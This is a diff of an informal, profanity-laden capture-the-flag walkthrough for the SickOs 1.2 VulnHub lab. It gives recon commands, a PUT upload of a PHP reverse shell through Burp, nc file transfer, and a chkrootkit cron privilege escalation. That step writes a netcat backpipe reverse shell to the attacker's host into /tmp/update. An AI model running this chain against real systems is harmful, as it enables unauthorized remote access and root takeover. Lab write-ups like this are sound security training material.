@@ -1,4 +1,5 @@
 #BEFORE YOU START, THIS MACHINE HAS A OUTBOUND FIREWALL ENABLED. I spent hours figuring this out :(. Sorry for the language in advance, I spent wayyyyy too long on this.
+[*]
 1. netdiscover for vm(users arp)
 netdiscover -i eth0 -r 172.16.16.0/24 **sunet for vms**
 Currently scanning: 172.16.16.0/24   |   Screen View: Unique Hosts                                                                                         
@@ -11,7 +12,7 @@ Currently scanning: 172.16.16.0/24   |   Screen View: Unique Hosts
  172.16.16.2     52:54:00:12:35:00      1      60  Unknown vendor                                                                                           
  172.16.16.3     08:00:27:38:b7:ba      1      60  PCS Systemtechnik GmbH                                                                                   
  172.16.16.16    08:00:27:f6:79:50      1      60  PCS Systemtechnik GmbH                  
-
+[*]
 2. Nmap scan on host
 root@hostmachine:~/Downloads# nmap 172.16.16.16
 Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-24 19:27 CDT
@@ -22,20 +23,17 @@ PORT   STATE SERVICE
 22/tcp open  ssh
 80/tcp open  http
 MAC Address: 08:00:27:F6:79:50 (Oracle VirtualBox virtual NIC)
-
-
-
+[*]
 3. Web scanning with gobuster
 /index.php (Status: 200)
 /test (Status: 301)
 **not a whole lot of shit going on... wow**
-
+[*]
 4. HOLY SHIT. look at http://172.16.16.16/index.php I've been saying this shit my whole ass mf life...
-
+[*]
 5. More web enumeration... with nikto this time..nothing interseting
 nikto -h 172.16.16.16 && nikto -h 172.16.16.16/test **found from dirbutser**
-
-
+[*]
 6. Bruh add this shit to your toolbelt. Curl -v -X OPTIONS http://172.16.16.16/test (tests all web options to include PUT method)
  Expire in 0 ms for 6 (transfer 0x5619f2f92dd0)
 *   Trying 172.16.16.16...
@@ -56,16 +54,14 @@ nikto -h 172.16.16.16 && nikto -h 172.16.16.16/test **found from dirbutser**
 < Date: Wed, 24 Apr 2019 20:03:49 GMT
 < Server: lighttpd/1.4.28
 < 
-
-
+[*]
 7. Startup burpesuite, verify 'proxy' tab localhost 8080 is the proxy, go back to the intercept tab
+[*]
 8. Go into firefox, and enable localhost 8080 as a manual proxy
-
+[*]
 9. Restart the request to http://172.16.16.16/test
 **you'll see the GET request there.
-
 modify the headers to look like so
-
 PUT /test/exploit.php HTTP/1.1
 Host: 172.16.16.16
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
@@ -79,31 +75,27 @@ Content-Length: 3151
 ****PASTE SHELL CODE HERE**** I got the shellcode from https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php. Modified it with our LHOST, and LPORT. LPORT has to be 443, for some fucking stupid ass reason(outbound firewall rules)
 
 **This modifes the request to PUT a new file called "exploit.php" in the directory
-
-
+[*]
 10. Start the reverse listener, and forward the PUT request
 nc -nvlp 443
-
 **clicked forward in burpsite once the shell code was posted**
-
+[*]
 11. Turn "intercept off" in burpsuite, or remove the proxy from firefox
-
+[*]
 12. Navigate to http://172.16.16.16/test/exploit.php
-
 **you will see the reverse shell populate**
-
+[*]
 13. Transfer linenum.sh to this host
 nc -nvlp 443 < /var/www/html/linenum.sh **Listen in a new tab on your machine**
 nc -nv 172.16.16.7 443 > linenum.sh **connect to your host, from remote machine**
-
+[*]
 14. Run linenum.sh
 chmod +x linenum.sh
 ./linenum.sh
-
+[*]
 15. You will find that the program chkrootkit is ran. This program has numerous 'known vulnerabilities'
 [-] Cron jobs:
 -rw-r--r-- 1 root root  722 Jun 19  2012 /etc/crontab
-
 /etc/cron.daily:
 total 72
 drwxr-xr-x  2 root root  4096 Apr 12  2016 .
@@ -113,24 +105,23 @@ drwxr-xr-x 84 root root  4096 Apr 24 12:23 ..
 -rwxr-xr-x  1 root root   314 Apr 18  2013 aptitude
 -rwxr-xr-x  1 root root   502 Mar 31  2012 bsdmainutils
 -rwxr-xr-x  1 root root  2032 Jun  4  2014 chkrootkit
-
-
+[*]
 16. When the cron job is ran, it will run the script /tmp/update as root if it is there.
 ref https://www.exploit-db.com/exploits/33899
-
+[*]
 17. After 2/3 hours of hell. I found that using reverse shells for bash, python, and perl do not work
 **inside file /tmp/update, but that they are being ran every minute or so
-
+[*]
 18. For some unholy fucking reason, you have to "shovel" the netcat command to /bin/sh, and let it run from there.
 nc -nvlp 443 **setup listener on your machine**
 mknod /tmp/backpipe p && /bin/sh 0</tmp/backpipe | nc 172.16.16.7 443 1>/tmp/backpipe
 
 ^^add that to /tmp/update^^
-
+[*]
 19. Summary
 I guess the whole point of this lab is to simulate broken/filtered tools. It took me hours upon hours thanks to the youtube video
 "Path to OSCP Vide0 4: Part 2: Sockos 1.2 Getting Root" I was able to figure it out
-
+[*]
 20. Capture the flag
 Ncat: Connection from 172.16.16.16:33516.
 id
@@ -148,7 +139,7 @@ WoW! If you are viewing this, You have "Sucessfully!!" completed SickOs1.2, the 
 Thanks for giving this try.
 
 @vulnhub: Thanks for hosting this UP!.
-
+[*]
 
 
 
